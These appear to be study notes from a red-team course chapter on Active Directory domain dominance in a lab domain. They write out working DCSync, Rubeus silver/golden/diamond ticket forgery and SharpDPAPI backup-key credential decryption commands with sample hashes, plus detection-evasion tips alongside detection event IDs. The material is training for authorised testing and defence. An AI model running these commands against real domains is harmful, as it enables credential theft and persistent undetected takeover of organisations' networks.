# CRTO — Domain Dominance

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Section:** Domain Dominance (Chapter 18)
**Objective:** Extract highly-sensitive authentication material to maintain domain-level access almost indefinitely

**Techniques covered:**
- DCSync — extract krbtgt hash via DRS protocol
- Silver Tickets — forge service tickets using computer/service account secrets
- Golden Tickets — forge TGTs using krbtgt hash
- Diamond Tickets — modify legitimate TGTs using krbtgt hash (stealthier)
- DPAPI Backup Key — extract domain-wide DPAPI decryption key

---

## Phase 1 — DCSync

**TTP:** T1003.006 — OS Credential Dumping: DCSync

### What DCSync Is

Domain Controllers replicate data between themselves using the **Directory Replication Service (DRS)** protocol. DCSync abuses this protocol to request replication data — specifically password hashes — from a DC, without touching LSASS on the DC itself.

**Requires:** Domain Admin, Enterprise Admin, or DC computer account privileges.

### Execute DCSync

```bash
# Pull krbtgt hash — the crown jewel
dcsync contoso.com CONTOSO\krbtgt

# Pull all hashes (full domain dump)
dcsync contoso.com
```

### Output — Key Values to Capture

```
SAM Username   : krbtgt
Hash NTLM      : 2d454c2120b54890b3db65406e5a5974
aes256_hmac    : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
aes128_hmac    : 90e173c1fedcdfeaeddb07e695b75cfa
```

> **Always capture AES256** — it's required for Golden/Diamond tickets and is harder to detect than RC4/NTLM usage.

### Why krbtgt Is the Primary Target

The krbtgt secret encrypts and signs all TGTs in the domain. Possessing it means:
- Forge valid TGTs for any user (Golden Ticket)
- Forge valid TGTs that are indistinguishable from legitimate ones (Diamond Ticket)
- The hash is **never automatically rotated** by AD — it persists indefinitely until manually changed (requires two resets to fully invalidate)

### OPSEC — Detection

- DRS replication from a **non-DC IP** is the primary IOC — defenders alert on event ID `4662` with GUIDs:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` — DS-Replication-Get-Changes / DS-Replication-Get-Changes-All
  - `89e95b76-444d-4c62-991a-0facbeda640c` — DS-Replication-Get-Changes-In-Filtered-Set
- Legitimate DRS traffic originates from known DC IPs only — any replication request from a workstation or server IP is immediately suspicious

---

## Phase 2 — Ticket Forgery

**TTP:** T1558 — Steal or Forge Kerberos Tickets

---

### Silver Tickets

**TTP:** T1558.002 — Forge Kerberos Service Tickets

A silver ticket is a **forged TGS** signed with a **service or computer account's secret** — not the krbtgt hash. It targets a specific service on a specific machine.

**Common use case:** Maintain persistent remote access to a machine after the original foothold is lost, using only the computer account hash.

#### Forge Silver Ticket — CIFS Access (Computer Account)

```powershell
# Run on attacker desktop (no Beacon needed — fully offline)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
  /service:cifs/lon-db-1 `
  /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/service` | `cifs/lon-db-1` | Target service SPN |
| `/aes256` | Computer account AES256 hash | Secret used to encrypt/sign the ticket |
| `/user` | `Administrator` | Username to impersonate (in the PAC) |
| `/domain` | `CONTOSO.COM` | Must be uppercase |
| `/sid` | Domain SID (without RID) | Used to build the PAC |
| `/nowrap` | — | Single-line base64 output |

**Default RIDs used by Rubeus:**
- `/id`: `500` (Administrator RID)
- `/groups`: `520,512,513,519,518` (DA, Domain Users, EA, Schema Admins, Group Policy Creator Owners)
- Override with `/id` and `/groups` when impersonating non-default users

#### Forge Silver Ticket — MSSQL Access (Service Account)

When you have a service account's plaintext password (e.g. from Kerberoasting), convert it to hashes first:

```powershell
# Step 1 — Convert plaintext to hashes
Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

# Output:
# rc4_hmac             : FC525C9683E8FE067095BA2DDC971889
# aes256_cts_hmac_sha1 : E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9

# Step 2 — Forge ticket impersonating a known sysadmin (rsteel)
Rubeus.exe silver `
  /service:MSSQLSvc/lon-db-1.contoso.com:1433 `
  /rc4:FC525C9683E8FE067095BA2DDC971889 `
  /user:rsteel `
  /id:1108 `
  /groups:513,1106,1107,4602 `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

> **Why custom `/id` and `/groups`:** The forged PAC must reflect rsteel's actual RID (`1108`) and group memberships for the SQL instance to recognise him as sysadmin. Default group RIDs won't include `4602` (Database Admins).

#### Inject and Use Silver Ticket

```bash
make_token CONTOSO\Administrator FakePass

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[base64]

run klist    # verify ticket present

ls \\lon-db-1\c$    # or sql-whoami for MSSQL ticket
```

#### Silver Ticket OPSEC

- **PAC validation** is the main mitigation — when enabled, the target computer sends the PAC to the KDC for signature verification. Silver tickets sign with the computer key, not krbtgt, so this check fails.
- **Detection without PAC validation:** A `4624` logon event on the target with **no corresponding `4769`** (TGS-REQ) is the indicator — silver tickets are forged offline, so no TGS-REQ is ever sent.
- **Anomaly detection:** Ensure `/domain` is uppercase — lowercase domain in a ticket is an IOC some tooling looks for. Rubeus handles this automatically.
- **Lifetime:** Computer account secrets rotate every 30 days by default — silver tickets expire when the secret changes.

---

### Golden Tickets

**TTP:** T1558.001 — Forge Kerberos TGTs

A golden ticket is a **forged TGT** signed with the **krbtgt AES256 hash**. Unlike silver tickets which target one service, golden tickets can be used to request TGS tickets for **any service in the domain**.

**Requires:** krbtgt AES256 hash (obtained via DCSync).

#### Forge Golden Ticket

```powershell
# Run on attacker desktop — fully offline
Rubeus.exe golden `
  /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

#### Inject and Use Golden Ticket

```bash
make_token CONTOSO\Administrator FakePass

execute-assembly Rubeus.exe ptt /ticket:[base64]

run klist
# Shows: Server: krbtgt/CONTOSO.COM (TGT in cache)

ls \\lon-dc-1\c$
# Windows uses the injected TGT to automatically request a CIFS TGS via normal TGS-REQ/TGS-REP

run klist
# Now shows both the TGT AND the newly obtained cifs/lon-dc-1 TGS
```

> **Key difference from Silver Ticket:** The golden TGT goes through the normal TGS-REQ process to obtain service tickets — this produces legitimate `4769` events. The missing piece is the `4768` (AS-REQ) that would normally precede it.

#### Golden Ticket OPSEC

- **Detection:** Missing `4768` (AS-REQ) before `4769` (TGS-REQ) — the TGT was forged offline, so no AS exchange occurred
- **Mimikatz default lifetime exploit:** Mimikatz sets golden ticket lifetime to **10 years** — immediately detectable by defenders monitoring ticket validity periods. Rubeus respects domain policy by default (10hr/7day renewal)
- **Persistence:** krbtgt hash never auto-rotates — golden ticket access persists until krbtgt is manually reset **twice** (two resets required to fully invalidate all outstanding tickets)

---

### Diamond Tickets

A diamond ticket is functionally identical to a golden ticket but is **created by modifying a legitimate TGT** rather than forging one from scratch. This makes it significantly harder to detect.

**How it differs from Golden Ticket:**

| Property | Golden Ticket | Diamond Ticket |
|---|---|---|
| Creation | Forged offline from scratch | Real TGT requested legitimately, then modified |
| AS-REQ (4768) | Missing — no AS exchange | Present — real AS-REQ was made |
| PAC validity | Signed with krbtgt — valid | Signed with krbtgt — valid |
| Peripheral data | Attacker-controlled — potential anomalies | Inherited from real TGT — accurate domain policy data |
| Detection | Missing 4768 before 4769 | Much harder — looks like a real TGT |

#### Forge Diamond Ticket

```bash
# /tgtdeleg — uses delegation trick to get a usable TGT for current user without creds
execute-assembly Rubeus.exe diamond `
  /tgtdeleg `
  /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticketuser:Administrator `
  /ticketuserid:500 `
  /domain:CONTOSO.COM `
  /nowrap
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/tgtdeleg` | — | Obtain a real TGT for the current user via delegation trick — no credentials needed |
| `/krbkey` | krbtgt AES256 | Used to decrypt the TGT, modify the PAC, re-encrypt, re-sign |
| `/ticketuser` | `Administrator` | Username to substitute into the PAC |
| `/ticketuserid` | `500` | RID to substitute |
| `/domain` | `CONTOSO.COM` | Domain FQDN |

**Rubeus outputs two tickets:**
1. Original TGT for current user (pchilds) — used as the base
2. Modified TGT with Administrator's identity — inject this one

#### Verify with Rubeus describe

```powershell
# Inspect the modified ticket — confirm Administrator identity with valid signatures
Rubeus.exe describe /servicekey:[krbtgt aes256] /ticket:[base64 modified TGT]
```

Key fields to verify:
- `UserName: Administrator` — identity successfully substituted
- `ServerChecksum: (VALID)` — re-signed correctly with krbtgt
- `KDCChecksum: (VALID)` — KDC checksum valid

> **Potential detection point:** The `FullName` field in the PAC still shows the original user's full name (e.g. `Polly Childs` instead of `Administrator`). A thorough analyst examining raw PAC data may spot this discrepancy.

#### Inject Diamond Ticket

```bash
make_token CONTOSO\Administrator FakePass
execute-assembly Rubeus.exe ptt /ticket:[base64 modified TGT]
run klist
ls \\lon-dc-1\c$
```

---

## Phase 3 — DPAPI Backup Key

**TTP:** T1555 — Credentials from Password Stores

### What the DPAPI Backup Key Is

DPAPI protects secrets (Credential Manager, browser passwords, certificates) by encrypting them with a **masterkey** derived from the user's password. When a user changes their password, the old masterkey becomes inaccessible.

To prevent data loss, a copy of every user's masterkey is encrypted with a **domain-wide backup key** stored in Active Directory. This backup key:
- Is randomly generated at domain creation
- Is **never automatically rotated** (like krbtgt)
- Has no officially supported rotation mechanism
- Can be extracted by a Domain Admin via the BackupKey Remote Protocol

**Adversarial value:** The backup key decrypts **all DPAPI-protected secrets for every user in the domain** — past and present — regardless of password changes.

### Extract the Backup Key

```bash
# Requires DA-level Beacon on lon-dc-1
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

Output:
```
[*] Preferred backupkey Guid : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                      : HvG1s[...snip...]lXQns=
```

Save the base64 key — this is the domain DPAPI backup key.

### Enumerate Credentials Without Backup Key

With local admin on a machine, you can list DPAPI credential blobs for all users — but cannot decrypt them without the masterkey:

```bash
execute-assembly SharpDPAPI.exe credentials
# Returns credential file metadata but:
# [X] MasterKey GUID not in cache: {120b3a8a-...}
# Cannot decrypt without the masterkey
```

### Decrypt All Credentials Using Backup Key

```bash
execute-assembly SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
```

Output:
```
TargetName  : Domain:target=TERMSRV/lon-ws-1
UserName    : LON-WS-1\Administrator
Credential  : Passw0rd!
```

**`/pvk` parameter:** The domain backup key — SharpDPAPI uses it to decrypt the masterkey for any user, which then decrypts all their DPAPI-protected credential blobs.

### What DPAPI Protects (Attack Surface)

| Secret Type | Tool to Decrypt |
|---|---|
| Windows Credential Manager | `SharpDPAPI.exe credentials` |
| Chrome/Edge saved passwords | `SharpDPAPI.exe rdg` or browser-specific modules |
| RDP saved credentials | `SharpDPAPI.exe rdg` |
| WiFi passwords | `SharpDPAPI.exe certificates` |
| Private keys / certificates | `SharpDPAPI.exe certificates` |

---

## Domain Dominance Summary — What to Do After DA

```
1. DCSync → krbtgt AES256 + NTLM hashes
       ↓
2. Extract DPAPI backup key → decrypt all credential stores
       ↓
3. Forge Diamond Ticket (preferred) or Golden Ticket for persistent DA access
       ↓
4. Silver Tickets for specific service persistence (machine accounts, service accounts)
```

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1003.006 | DCSync | Extract krbtgt + all hashes via DRS protocol |
| T1558.001 | Golden Ticket | Forge TGT with krbtgt AES256 |
| T1558.002 | Silver Ticket | Forge TGS with computer/service account secret |
| T1558 | Diamond Ticket | Modify legitimate TGT with krbtgt AES256 |
| T1555 | Credentials from Password Stores | DPAPI backup key decrypts all credential blobs |

---

## Key Takeaways

- **DCSync requires DA** — but produces the krbtgt hash which enables all subsequent persistence techniques. Target krbtgt first, then all other accounts.
- **Always grab AES256** — RC4/NTLM usage is more detectable; AES256 is the preferred hash for ticket forgery
- **Silver Ticket scope is limited** — tied to one service on one machine; rotates with computer account password (30 days). Good for short-term persistence on specific machines.
- **Golden Ticket scope is unlimited** — any service in the domain; krbtgt never auto-rotates. Good for long-term domain-wide persistence.
- **Diamond Ticket is the stealthiest option** — a real AS-REQ backs it, peripheral PAC data is legitimate. Prefer this over Golden on monitored environments.
- **DPAPI backup key never rotates** — once extracted, it decrypts all user credential stores indefinitely. Extract it alongside DCSync as standard post-DA procedure.
- **krbtgt requires two password resets** to fully invalidate outstanding tickets — defenders must reset it twice in quick succession to evict an attacker using Golden/Diamond tickets
- **Mimikatz 10-year ticket lifetime** is an immediate IOC — always use Rubeus which respects domain policy defaults
